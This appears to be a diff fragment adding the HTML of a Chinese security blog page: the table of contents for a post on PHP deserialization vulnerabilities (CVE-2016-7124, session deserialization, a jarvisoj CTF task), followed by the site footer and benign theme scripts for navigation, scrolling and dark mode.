+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-php序列化和反序列化基础">0x02 PHP序列化和反序列化基础</a>
+      <ul>
+        <li><a href="#php序列化serialize">PHP序列化：serialize</a></li>
+        <li><a href="#php反序列化unserialize">PHP反序列化：unserialize</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-常见魔术方法">0x03 常见魔术方法</a>
+      <ul>
+        <li><a href="#__sleep">__sleep()</a></li>
+        <li><a href="#__wakeup">__wakeup()</a></li>
+        <li><a href="#__construct">__construct</a></li>
+        <li><a href="#__destruct">__destruct()</a></li>
+        <li><a href="#__tostring">__ToString()</a></li>
+        <li><a href="#热身题">热身题</a></li>
+        <li><a href="#反序列化对象注入-cve-2016-7124">反序列化对象注入-CVE-2016-7124</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-session反序列化漏洞">0x04 session反序列化漏洞</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#存储机制">存储机制</a></li>
+        <li><a href="#php-session中的序列化危害">PHP Session中的序列化危害</a></li>
+        <li><a href="#jarvisoj-web的一道session反序列化">jarvisoj-web的一道SESSION反序列化</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x05-参考">0x05 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
